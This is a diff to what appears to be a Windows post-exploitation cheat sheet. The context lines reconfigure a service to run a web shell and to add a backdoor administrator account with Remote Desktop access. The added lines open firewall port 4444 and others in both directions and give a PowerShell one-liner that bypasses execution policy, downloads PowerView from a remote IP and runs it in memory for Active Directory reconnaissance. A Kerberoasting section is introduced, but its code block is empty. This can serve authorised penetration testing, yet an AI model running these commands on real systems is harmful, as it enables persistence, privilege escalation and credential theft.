@@ -83,5 +83,32 @@ Reconfigure Service:
 sc config ServiceName depend= "" start= demand binpath= "C:\Inetpub\wwwroot\shell443.exe" obj= ".\LocalSystem" password= ""
 sc config ServiceName binPath= "cmd /c net user haxxor haxxor123 /add && net localgroup Administrators haxxor /add && net localgroup 'Remote Desktop Users' haxxor /add"
 ```
+## Open /Allow Ports in Firewall
+Allow Ports 80, 443 and 4444 as Inbound and outbound rules in the firewall (needs admin priveleges)
+```
+netsh advfirewall firewall add rule action=allow name=tunnelI dir=in protocol=tcp localport='80,443,4444'
+netsh advfirewall firewall add rule action=allow name=tunnelO dir=out protocol=tcp remoteport='80,443,4444'
+```
+## Active Directory Resource
 
+### Import Powerview into memory and execute commands
 
+```
+powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.101.24/powerview.ps1'); Get-DomainController
+```
+
+### Powerview Reference
+
+https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
+https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview
+
+### Active Directory Reference
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md
+
+## Kerberoasting
+
+InvokeKerberoast powershell script will request a service ticket from the DC for the service accounts which you can then copy and crack
+
+```
+```
